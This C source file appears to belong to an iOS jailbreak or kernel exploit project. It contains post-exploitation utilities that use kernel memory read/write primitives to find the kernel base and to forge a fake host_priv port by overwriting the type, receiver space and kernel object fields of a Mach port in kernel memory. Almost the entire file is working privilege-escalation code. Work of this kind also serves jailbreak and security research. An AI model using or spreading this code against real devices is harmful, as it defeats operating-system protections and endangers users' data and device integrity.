#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>

#include "kutils.h"
#include "kmem.h"
#include "QiLin.h"
#include "offsets.h"
#include "find_port.h"

uint64_t the_realhost;

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
    cached_task_self_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? getAddressOfPort(getpid(), mach_task_self()) : find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    printf("task self: 0x%llx\n", cached_task_self_addr);
  }
  return cached_task_self_addr;
}

uint64_t ipc_space_kernel() {
  return rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t current_thread() {
  uint64_t thread_port = (kCFCoreFoundationVersionNumber >= 1450.14) ? getAddressOfPort(getpid(), mach_thread_self()) : find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
  return rk64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}

uint64_t find_kernel_base() {
  uint64_t hostport_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? getAddressOfPort(getpid(), mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  the_realhost = realhost;
  
  uint64_t base = realhost & ~0xfffULL;
  // walk down to find the magic:
  for (int i = 0; i < 0x10000; i++) {
    if (rk32(base) == 0xfeedfacf) {
      return base;
    }
    base -= 0x1000;
  }
  return 0;
}
mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
  if (fake_host_priv_port != MACH_PORT_NULL) {
    return fake_host_priv_port;
  }
  // get the address of realhost:
  uint64_t hostport_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? getAddressOfPort(getpid(), mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  // allocate a port
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate port\n");
    return MACH_PORT_NULL;
  }
  
  // get a send right
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // locate the port
  uint64_t port_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? getAddressOfPort(getpid(), port) : find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
  
  // change the space of the port
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
  
  // set the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
  
  fake_host_priv_port = port;
  
  return port;
}

